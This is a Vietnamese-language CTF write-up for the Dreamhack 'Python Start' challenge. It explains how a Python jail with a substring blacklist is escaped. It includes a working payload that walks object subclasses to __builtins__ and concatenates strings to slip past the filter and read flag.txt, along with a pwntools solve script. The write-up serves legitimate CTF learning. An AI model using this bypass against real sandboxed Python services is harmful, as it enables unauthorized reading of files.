# Write-up: Dreamhack - Python Start

#### 1. Phân Tích Ban Đầu (Initial Analysis)

Challenge cung cấp 3 file: `chall.py`, `Dockerfile`, và `flag.txt`.
*   **`chall.py`**: Một script Python nhận input từ người dùng, lọc qua một danh sách từ cấm, và nếu không có từ cấm, nó sẽ thực thi input bằng `exec()`. Quan trọng nhất, toàn bộ khối `exec()` được bọc trong `try...except: pass`, nghĩa là mọi lỗi thực thi (runtime error) sẽ bị bỏ qua một cách lặng lẽ.
*   **`Dockerfile`**: Cho biết môi trường chạy là `python:3.12-alpine`, một phiên bản Linux cực kỳ tối giản. Điều này rất quan trọng vì các module được nạp sẵn sẽ khác biệt so với môi trường phát triển thông thường (như Windows hoặc Ubuntu). Dockerfile cũng tiết lộ server được chạy bằng `socat`, và tham số `stderr` được sử dụng, nghĩa là luồng lỗi chuẩn (stderr) sẽ được chuyển ra socket mạng.
*   **Danh sách từ cấm**: `['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', 'sh', 'break', 'mro', 'cat', 'flag']`. Đây là những từ cấm kinh điển, chặn các phương thức đọc file và thực thi lệnh trực tiếp.

**Mục tiêu**: Viết một đoạn code Python để đọc nội dung file `flag.txt` và in ra màn hình mà không vi phạm bộ lọc.

#### 2. Con Đường Thất Bại & Những Bài Học

Hành trình giải bài này là một chuỗi các thử nghiệm và sai lầm, mỗi sai lầm tiết lộ thêm một manh mối quan trọng.

*   **Thất bại #1: Giả định sai về môi trường**: Ban đầu, chúng ta giả định các lớp như `subprocess.Popen` có sẵn. Tuy nhiên, trên môi trường tối giản, nó không được nạp, dẫn đến lỗi `ValueError: 'Popen' is not in list`.
*   **Thất bại #2: Bỏ qua bộ lọc**: Khi cố gắng dùng `os.popen` thông qua một lớp như `_Printer`, payload bị chặn vì chứa chuỗi con `'os'` và `'open'`. Điều này dạy chúng ta rằng bộ lọc rất đơn giản, chỉ kiểm tra sự tồn tại của chuỗi con.
*   **Thất bại #3: Sai Index**: Sau khi né bộ lọc, payload vẫn không hoạt động. Lý do là index của lớp `_Printer` (và các lớp khác) trên máy local (Windows) hoàn toàn khác so với trên server (Alpine Linux).
*   **Thất bại #4: Lỗi `KeyError` bị che giấu**: Đây là cái bẫy tinh vi nhất. Sau khi tìm được index chính xác của `_Printer` và `DirEntry` trên server, payload vẫn thất bại. Lý do là trên môi trường Alpine tối giản này, `__init__.__globals__` của các lớp đó **không chứa module `os`**. Lệnh `...['o'+'s']...` gây ra lỗi `KeyError`, nhưng nó đã bị `try...except: pass` "nuốt chửng", khiến chúng ta nghĩ rằng không có gì xảy ra.

#### 3. Con Đường Dẫn Đến Thành Công

Sau khi loại bỏ các giả định sai, chiến lược đúng đắn nhất là:
1.  **Không tin vào môi trường local**: Phải lấy thông tin trực tiếp từ server.
2.  **Lợi dụng `stderr`**: Vì `socat` chuyển hướng `stderr`, chúng ta phải in mọi thứ (cả thông tin gỡ lỗi và flag) ra `sys.stderr` để tránh lỗi I/O buffering.
3.  **Đi đường vòng, nhưng phải chắc chắn**: Thay vì cố gắng tìm `os`, một module có thể không được nạp, chúng ta sẽ tìm lại hàm `open()` gốc của Python. Hàm này nằm trong `__builtins__`, một dictionary gần như luôn có thể truy cập được.

**Kế hoạch tấn công cuối cùng:**
1.  **Giai đoạn 1: Trinh sát (Reconnaissance)** - Gửi một payload để leak toàn bộ danh sách tên các lớp có sẵn trên server.
    ```python
    discovery_payload = "print([c.__name__ for c in ().__class__.__base__.__subclasses__()], file=sys.stderr)"
    ```
    Kết quả thu được là một danh sách dài, trong đó chúng ta xác định được lớp `os.DirEntry` tồn tại, và index của nó là **144**. `DirEntry` là một điểm khởi đầu tốt vì nó là một lớp ổn định.

2.  **Giai đoạn 2: Tấn công (Exploitation)** - Sử dụng index đã biết để xây dựng payload cuối cùng, mục tiêu là lấy lại hàm `open()` từ `__builtins__`.

#### 4. Phân Tích Payload Chiến Thắng

Payload cuối cùng hoạt động hoàn hảo:
```python
print(().__class__.__base__.__subclasses__()[144].__init__.__globals__['__builtins__']['o'+'pen']('f'+'lag.txt').__getattribute__('r'+'ead')(), file=sys.stderr)
```

Hãy chia nhỏ nó ra:
*   `().__class__.__base__.__subclasses__()`: Điểm vào sandbox escape kinh điển, lấy danh sách tất cả các lớp con của `object`.
*   `[144]`: Chọn lớp `os.DirEntry` với index chính xác đã tìm được trên server.
*   `.__init__.__globals__`: Truy cập vào dictionary chứa các biến toàn cục nơi hàm `__init__` của `DirEntry` được định nghĩa.
*   `['__builtins__']`: Từ globals, truy cập dictionary `__builtins__`, nơi chứa tất cả các hàm và kiểu dữ liệu gốc của Python.
*   `['o'+'pen']`: Lấy hàm `open` từ `__builtins__`. Chuỗi `'open'` được ghép từ `'o'+'pen'` để né bộ lọc.
*   `('f'+'lag.txt')`: Gọi hàm `open` vừa lấy được để mở file `flag.txt`. Tên file được ghép từ `'f'+'lag.txt'` để né bộ lọc.
*   `.__getattribute__('r'+'ead')()`: Từ đối tượng file trả về, chúng ta không thể gọi `.read()` trực tiếp. Thay vào đó, dùng `__getattribute__` để lấy phương thức `read` (ghép từ `'r'+'ead'`) rồi gọi nó.
*   `print(..., file=sys.stderr)`: In kết quả (nội dung flag) ra luồng lỗi chuẩn để đảm bảo dữ liệu được gửi đi ngay lập tức và không bị kẹt trong bộ đệm.

#### 5. Script Tấn Công Cuối Cùng (`solve.py`)

```python
from pwn import *

host = "host8.dreamhack.games"
port = 18211

p = remote(host, port)

p.recvuntil(b"Input code > ")

# Payload tấn công, sử dụng DirEntry (index 144) làm điểm khởi đầu
attack_payload = f"print(().__class__.__base__.__subclasses__()[144].__init__.__globals__['__builtins__']['o'+'pen']('f'+'lag.txt').__getattribute__('r'+'ead')(), file=sys.stderr)"

p.sendline(attack_payload.encode())

print("[*] Waiting for the flag...")
# Nhận và in flag
flag = p.recvall().decode()
print("\n[+] FLAG FOUND: " + flag.strip())

p.close()
```

Bài challenge này là một ví dụ tuyệt vời về việc gỡ lỗi trong môi trường "hộp đen", nhấn mạnh tầm quan trọng của việc không đưa ra giả định và phải dựa vào thông tin lấy được trực tiếp từ mục tiêu.